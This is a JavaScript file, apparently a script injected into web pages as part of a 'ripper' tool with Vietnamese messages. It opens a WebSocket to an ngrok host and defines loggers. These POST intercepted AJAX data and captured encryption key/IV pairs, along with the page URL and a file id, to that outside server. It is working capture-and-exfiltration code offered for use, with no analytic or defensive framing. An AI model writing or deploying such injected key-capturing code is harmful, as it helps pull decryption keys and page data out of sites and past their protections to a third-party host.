window.keys = {}
window.rip_configs = {
  ajax_logger: "/api/ajax-logger",
  keys_logger: "/api/keys-logger",
  host: "https://eel-moral-ape.ngrok-free.app",
}
;(() => {
  if (typeof WebSocket !== "undefined" && window.rip_configs) {
    const socket = new WebSocket(`ws://${new URL(window.rip_configs.host).host}/ws`)
    // message is received
    socket.addEventListener("message", (event) => {
      console.log(`Nhận dữ liệu từ ripper: ${event.data}`)
    })

    // socket opened
    socket.addEventListener("open", (event) => {
      window.socket = socket
      socket.send(JSON.stringify({ action: "ping" }))
    })

    // error handler
    socket.addEventListener("error", (event) => {
      alert(`Xảy ra lỗi khi kết nối tới máy chủ`)
    })
  }
})()

window.logger_callback = async (url, data_logger, show_alert = false) => {
  if (typeof fetch !== "undefined") {
    try {
      const response = await fetch(url, {
        method: "POST",
        body: JSON.stringify(data_logger),
        headers: {
          "Content-Type": "application/json",
          "X-Inject-Url": window.location.href,
        },
      })

      if (show_alert) {
        const data = await response.json()
        alert(data.message)
      }
    } catch (error) {
      show_alert && alert(error.message)
    }
  }
}

window.ajax_logger = function (data) {
  const { host, ajax_logger } = window.rip_configs || {}
  if (host && ajax_logger) window.logger_callback(host + ajax_logger, data, true)
}

window.key_logger = function (data) {
  const { host, keys_logger, key_logger } = window.rip_configs || {}

  if (data.key && data.iv && host) {
    window.keys[data.key] = data.iv

    if (window.key_logger_timeout) {
      clearTimeout(window.key_logger_timeout)
      window.key_logger_timeout = null
    }

    window.key_logger_timeout = setTimeout(() => {
      window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
    }, 3000)
  }

  if (host && key_logger) window.logger_callback(host + key_logger, data)
}
